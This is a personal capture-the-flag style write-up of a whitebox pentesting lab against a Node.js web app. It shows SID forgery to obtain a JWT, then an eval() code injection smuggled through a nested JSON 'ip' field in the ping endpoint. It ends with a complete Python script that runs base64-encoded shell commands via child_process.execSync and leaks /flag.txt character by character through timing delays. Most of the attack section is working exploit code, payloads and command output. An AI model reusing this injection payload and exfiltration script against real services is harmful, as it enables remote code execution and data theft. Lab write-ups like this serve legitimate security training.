We can spin up a machine in web, but we got also access to the local app source code so we must analyze the local code in order to understand how to attack the functions.
It might be a blind-time based, http based or non.

1)I asked chatgpt to generate me a function that creates a SID based on the UID shipped(formula in the source code  // `sid format: uid + random characters + checksum`)
```
└─$ cat gen_sid.js   
function generateSid(uid) {
  const randomLength = 10;
  const checksumLength = 2;
  const alphanumericChars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';

  // Generate random characters
  let random = '';
  for (let i = 0; i < randomLength; i++) {
    const randomIndex = Math.floor(Math.random() * alphanumericChars.length);
    random += alphanumericChars[randomIndex];
  }

  // Calculate checksum
  const checksum = random
    .split('')
    .reduce((acc, curr) => acc + curr.charCodeAt(0), 0)
    .toString(16);

  // Pad the checksum if it's not 2 characters long
  const paddedChecksum = checksum.padStart(checksumLength, '0');

  // Concatenate uid, random characters, and checksum
  const sid = uid + random + paddedChecksum;

  return sid;
}


```
//Running this on **uid=yovecio** gives back `sid=yovecioWHFXr37h8S30c`


2)Now we should be able to perform a full authentication by shipping **uid +  sid** towards the route `/api/auth/aunthenticate` and get a  JWT token back:
```
curl -s -X POST -H "Content-Type: application/json" -d '{"uid":"yovecio","sid":"yovecioBoa0ynF8zo390"}' http://83.136.253.251:45211/api/auth/authenticate{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiJ5b3ZlY2lvIiwiaWF0IjoxNzA4OTc0OTk5LCJleHAiOjE3MDkwNjEzOTl9.5zCUR7OcwXFYblyKi7-GSvFo8DyvEbzh-F6onROA7Os"}      
```


3)With this token can we now get the service commands to work!
```
curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiJ5b3ZlY2lvIiwiaWF0IjoxNzA4OTczNzYyLCJleHAiOjE3MDkwNjAxNjJ9.BFBUi-S2KVBncVu7sRMim0VXtH_zurqN0R9V402XS1M" http://94.237.49.138:45502/api/service/hostname
ng-835785-introtowhiteboxpentestingskillsassessment-juuqj-zkxbg

```
We can check the running username(root is awesome)
```
curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiJ5b3ZlY2lvIiwiaWF0IjoxNzA4OTczNzYyLCJleHAiOjE3MDkwNjAxNjJ9.BFBUi-S2KVBncVu7sRMim0VXtH_zurqN0R9V402XS1M" http://94.237.49.138:45502/api/service/id      
uid=0(root) gid=0(root) groups=0(root)

```
The cat function was indeed interesting but it commented in the **app.js** which means we have to find another way in. 
The ls  function show that the flag is hidden under **/flag.txt**

4)Now we need to find a interesting function to inject our code, so far I don't see any of service functions that can be used with HTTP codes  that show some kind of verbose or message is sent to verbose without any sanitation.
So my idea is to check all the functions that use eval() and we have ping & whoami functions
**whoami**(this seem very interesting as uid is passd in the eval without sanitization.)
```
async function whoami(req, res, next) {
  const uid = req.user.uid;

  try {
    child_process.execFile("whoami", function (error, stdout) {
      eval(`res.send((${uid}): ${stdout})`);
    });
  } catch (e) {
    return next({
      message: "Could not execute command.",
      statusCode: 500,
    });
  }
}

```
Now I asked for tips since I wasn't able to get the program to execute a ping to a mine address but basically the culprit is to use a json code into another because the eval(calls **json.parse**(here he parses the `{ip: MYIP}`) and now it ex-filtrates the ip, this is a recursion basically.) That's why wasn't enough to use `{external:true, ip: 1.1.1.1}`
Now we can make the application perform a specific ip ping:
```
└─# curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiJ5b3ZlY2lvIiwiaWF0IjoxNzA5MTEzNjgxLCJleHAiOjE3MDkyMDAwODF9.TJiLrEkQJDTf9sQmyIuuLD57p6dQTkSjol3BDiveCjA" -d '{"external":"true","ip":"{\"ip\":\"10.10.10.10\"}"}' http://localhost:5000/api/service/ping 
PING 10.10.10.10 (10.10.10.10) 56(84) bytes of data.
```


5)Now that we understood how to get into eval and parse my ip, we need to find a way how we can inject some code... So here I was guided by another dude and apparently I was right to inject '); to escape the **JSON.parse()** function but I had to do it outside the JSON code `{"external":"true", "ip": "{}HERE"}`
Resulting in: 
```
└─# cat params.json 
{"external": "true", "ip": "{}');console.log(1337)//"}
```


6) Now we have a RCE the problem is that the **execSync** is not outputting the results but only works by console output which means we will have to develop a python script that uses a blind time based ex-filtration to parse the chars!
I will reuse the code from the Academy and the query should be something like... 
`time (cat /flag.txt | head -c 1 | tail -c 1 | { read c; if [ "$c" = "D" ]; then sleep 3; fi; })`

The script to be used is:
```
#!/usr/bin/python3
import requests, json, string, base64
from time import time

alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
flag = ""
server = "83.136.251.235"
port = 34611
url = f"http://{server}:{port}"
auth_endpoint = f"{url}/api/auth/authenticate"
qr_endpoint = f"{url}/api/service/ping"

#Getting the admin cookie
headers = {"Content-Type": "application/json"}
data = {"uid":"yovecio","sid":"yovecioBoa0ynF8zo390"}
response = requests.post(auth_endpoint, headers=headers, data=json.dumps(data))
token = response.json()['token']

#Getting the flag
for i in range(1, 50): 
    for char in alphabet:
        #Adjust the command you want to use...
        temp = 'cat /flag.txt | head -c %s | tail -c 1 | { read c; if [ "$c" = "%s" ]; then sleep 2; fi; }' %(i, char)
        #Converting to B64    
        temp_bytes = temp.encode("ascii")
        base64_bytes = base64.b64encode(temp_bytes) 
        base64_string = base64_bytes.decode("ascii")

        headers = {"Content-Type": "application/json", "Authorization": f"Bearer {token}"}
        #Sending the payload(using B64 encoding do not have to deal with  quotes in JSON)
        payload ={"external": "true", "ip": "{}') + require('child_process').execSync('echo " + base64_string + "| base64 -d | bash')//"} 

        #Starting the timer
        t0 = time()
        response = requests.post(qr_endpoint, headers=headers, data=json.dumps(payload))
        
        #If took more than 2 sec then timebased is true
        t1 = time() - t0
        if (t1 >= 2):
            flag += char
            print("The flag is: " + flag)

```
